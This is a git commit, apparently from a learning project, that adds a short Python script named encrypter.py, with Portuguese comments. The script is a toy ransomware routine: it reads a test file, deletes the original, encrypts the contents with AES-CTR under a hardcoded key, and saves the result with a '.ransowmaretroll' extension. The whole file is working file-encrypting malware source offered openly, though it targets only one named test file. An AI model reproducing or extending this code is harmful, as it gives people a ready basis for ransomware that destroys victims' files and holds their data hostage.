0b9b9b595264269dc4330faded012290ce2cbfdc
ybludo <147006091+ybludo@users.noreply.github.com>
2025-01-09 09:57:25 -0300

    Add files via upload

---
+++ encrypter.py
@@ -0,0 +1,24 @@
+import os
+import pyaes
+
+## abrir o arquivo a ser criptografado
+file_name = 'teste.txt'
+file = open(file_name, 'rb')
+file_data = file.read()
+file.close()
+
+## remover o arquivo original
+os.remove(file_name)
+
+## definir a chave de encriptação
+key = b'testeransomwares'
+aes = pyaes.AESModeOfOperationCTR(key)
+
+## criptografar o arquivo
+crypto_data = aes.encrypt(file_data)
+
+## salvar o arquivo criptografado
+new_file = file_name + '.ransowmaretroll'
+new_file = open(f'{new_file}', 'wb')
+new_file.write(crypto_data)
+new_file.close()
